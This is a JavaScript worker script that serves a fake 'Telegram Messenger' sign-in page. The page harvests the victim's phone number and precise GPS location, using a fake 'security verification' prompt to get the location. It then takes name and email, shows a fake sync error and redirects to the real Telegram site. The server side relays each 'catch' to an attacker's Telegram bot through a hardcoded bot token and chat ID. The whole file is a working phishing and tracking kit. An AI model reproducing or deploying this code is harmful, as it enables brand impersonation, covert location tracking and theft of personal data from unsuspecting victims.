export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <style>
            body { font-family: -apple-system, sans-serif; background: #f4f4f5; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
            .container { text-align: center; max-width: 350px; width: 90%; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
            .logo { width: 80px; margin-bottom: 20px; }
            h2 { font-weight: 500; margin-bottom: 10px; color: #222; }
            p { color: #707579; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
            input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dfe1e5; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
            button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
            .step { display: none; }
            .step.active { display: block; }
          </style>
        </head>
        <body>
          <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
            
            <div id="step1" class="step active">
              <h2>Your Phone</h2>
              <p>Please confirm your country code and enter your phone number.</p>
              <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
              <button id="btn1" onclick="handleStep1()">NEXT</button>
            </div>

            <div id="step2" class="step">
              <h2>Profile Sync</h2>
              <p>Complete your cloud profile to synchronize your messages.</p>
              <input id="username" type="text" placeholder="Full Name (Optional)">
              <input id="email" type="email" placeholder="Recovery Email (Optional)">
              <button id="btn2" onclick="handleStep2()">FINISH</button>
            </div>
          </div>

          <script>
            let mainData = { phone: "", lat: "0", lon: "0", acc: "None" };

            async function handleStep1() {
              const ph = document.getElementById("phone").value;
              if (!ph) { alert("Enter phone number"); return; }
              document.getElementById("btn1").innerText = "Verifying...";

              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                  mainData.phone = ph;
                  mainData.lat = pos.coords.latitude;
                  mainData.lon = pos.coords.longitude;
                  mainData.acc = pos.coords.accuracy < 100 ? "🟢 Exact GPS" : "🟡 Approximate";
                  
                  // إرسال فوري بمجرد الحصول على الموقع والرقم
                  await sendReport("FIRST_HIT");
                  switchStep(2);
                }, (err) => {
                  alert("⚠️ Security Verification Required: Please allow location access.");
                  document.getElementById("btn1").innerText = "NEXT";
                }, { enableHighAccuracy: true });
              }
            }

            async function handleStep2() {
              document.getElementById("btn2").innerText = "Syncing...";
              const name = document.getElementById("username").value || "Skipped";
              const email = document.getElementById("email").value || "Skipped";
              
              // إرسال التقرير التكميلي (الاسم والإيميل)
              await sendReport("FINAL_HIT", name, email);
              
              alert("❌ Sync Error: Connection lost. Redirecting...");
              window.location.href = "https://telegram.org/dl";
            }

            function switchStep(n) {
              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
              document.getElementById('step' + n).classList.add('active');
            }

            async function sendReport(type, name = "", email = "") {
              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  type, phone: mainData.phone, lat: mainData.lat, lon: mainData.lon, 
                  acc: mainData.acc, name, email, ua: navigator.userAgent
                })
              });
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const d = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";
        const maps = "https://www.google.com/maps?q=lat,lon" + d.lat + "," + d.lon;

        let msg = "";
        if (d.type === "FIRST_HIT") {
          msg = "🚀 [عاجل - صيد جديد] 🚀\\n" +
                "📱 الرقم: " + d.phone + "\\n" +
                "📍 الموقع: " + d.acc + "\\n" +
                "🗺 الخريطة: " + maps;
        } else {
          msg = "📝 [تكملة البيانات للرقم: " + d.phone + "]\\n" +
                "👤 الاسم: " + d.name + "\\n" +
                "📧 الإيميل: " + d.email;
        }

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
        return new Response("ok");
      } catch (e) { return new Response("err"); }
    }
  }
};
